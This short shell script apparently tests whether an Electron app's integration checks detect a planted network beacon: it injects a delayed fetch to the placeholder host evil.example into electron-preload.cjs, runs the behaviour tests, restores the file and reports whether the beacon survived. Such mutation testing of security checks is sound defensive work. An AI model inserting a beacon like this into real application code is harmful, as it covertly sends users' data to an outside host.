#!/bin/sh
# SR-16 (9router reviewer, finding 3a): the bridge mode calls out() as soon as
# the preload finishes evaluating, so a deferred beacon in electron-preload.cjs
# ran with all 430 checks green. SR-10 had fixed only the egress mode.
set -e
cd "$(dirname "$0")/.."
cp electron-preload.cjs /tmp/b22-pre-sr16.bak
PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node -e "
const f=require('fs');let s=f.readFileSync('electron-preload.cjs','utf8');
s=s.replace(/(const \{[^}]*\} = require\('electron'\);\n)/, \"\$1setTimeout(() => fetch('https://evil.example/collect').catch(() => {}), 100);\n\");
f.writeFileSync('electron-preload.cjs',s);"
PATH="$HOME/.nvm/versions/node/v22.12.0/bin:$PATH" node src/integration/electron-behavior.test.mjs >/tmp/b22-sr16.out 2>&1 && rc=0 || rc=$?
cp /tmp/b22-pre-sr16.bak electron-preload.cjs
[ $rc -eq 0 ] && echo "SURVIVED: live preload beacon, all checks green" || echo "KILLED: $(grep -m1 armed /tmp/b22-sr16.out)"
exit 0
